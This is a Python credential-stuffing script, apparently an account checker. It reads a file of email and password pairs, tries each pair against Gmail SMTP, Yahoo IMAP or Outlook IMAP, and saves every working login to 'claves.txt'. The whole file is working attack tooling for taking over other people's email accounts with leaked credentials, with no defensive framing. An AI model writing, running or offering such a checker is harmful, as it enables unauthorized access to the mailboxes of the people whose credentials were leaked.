#!/usr/bin/python
import sys
import threading
import imaplib
import smtplib
from eliminar import eliminarRepetidos

def checklogin(email,contra,f,num):
	num[0] += 1
	posC = email.find("@gmail.com")
	posY = email.find("@yahoo.com")
	if posC != -1:
		if(checkLoginGmail(email,contra)):
			print("Exito G :) email:{0} password:{1}".format(email,contra))
			f.write("\nemail:{0} password:{1}".format(email,contra))
		else:
			pass
			#print("no Exito :( email:{0} password:{1}".format(email,contra))
	elif posY != -1:
		if(checkLoginYahoo(email,contra)):
			print("Exito Y :) email:{0} password:{1}".format(email,contra))
			f.write("\nemail:{0} password:{1}".format(email,contra))
		else:
			pass
			#print("no Exito :( email:{0} password:{1}".format(email,contra))
	else:
		if (checkLoginMS(email,contra)):
			print("Exito M :) email:{0} password:{1}".format(email,contra))
			f.write("\nemail:{0} password:{1}".format(email,contra))
		else:
			pass
			#print("no Exito :( email:{0} password:{1}".format(email,contra))
	num[0] -= 1

def checkLoginYahoo(email,contra):
	server = imaplib.IMAP4_SSL("imap.mail.yahoo.com", 993)
	try:
		server.login(email,contra)
		return True
	except:
		return False

def checkLoginGmail(email,contra):
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo()
	gmail_user = email
	gmail_pwd = contra
	try:
		smtpserver.login(gmail_user, gmail_pwd)
		return True
	except:
		return False

def checkLoginMS(email,contra):
	server = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
	try:
		server.login(email,contra)
		return True
	except:
		return False

if __name__ == "__main__":
	inputTXT=sys.argv[1]
	outputTXT="claves.txt"
	fil = open(inputTXT,"r")
	datos = open(outputTXT,"a")
	lineas=fil.read().split('\n')
	fichero = open(inputTXT, 'r')
	numLineas = len(fichero.readlines())
	lineasActuales = 0
	num = [0]
	for linea in lineas:
		try:
			linea=linea.split(',')
			email=linea[0]
			contra=linea[1]
			checklogin(email,contra,datos,num)
		except:
			print(linea)
		finally:
			lineasActuales += 1
			print("%{0}".format(float((100/numLineas)*lineasActuales)))
	eliminarRepetidos(inputTXT)
	eliminarRepetidos(outputTXT)